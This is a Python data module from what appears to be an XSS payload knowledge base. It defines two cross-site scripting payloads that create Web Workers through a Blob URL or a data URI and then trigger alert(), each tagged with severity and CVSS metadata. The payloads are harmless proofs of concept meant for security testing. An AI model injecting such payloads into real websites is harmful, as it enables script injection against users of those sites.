#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Web Workers XSS Payloads
"""

from ..models import PayloadEntry


WORKER_PAYLOADS = {
    "worker_inline": PayloadEntry(
        payload="<script>var b=new Blob(['postMessage(1)'],{type:'application/javascript'});var w=new Worker(URL.createObjectURL(b));w.onmessage=e=>alert(e.data)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Inline Worker",
        tags=["worker", "blob"],
        reliability="high",
    ),
    "worker_data_uri": PayloadEntry(
        payload="<script>new Worker('data:application/javascript,postMessage(1)').onmessage=e=>alert(e.data)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Worker data URI",
        tags=["worker", "data-uri"],
        reliability="medium",
    ),
}

WORKER_PAYLOADS_TOTAL = len(WORKER_PAYLOADS)
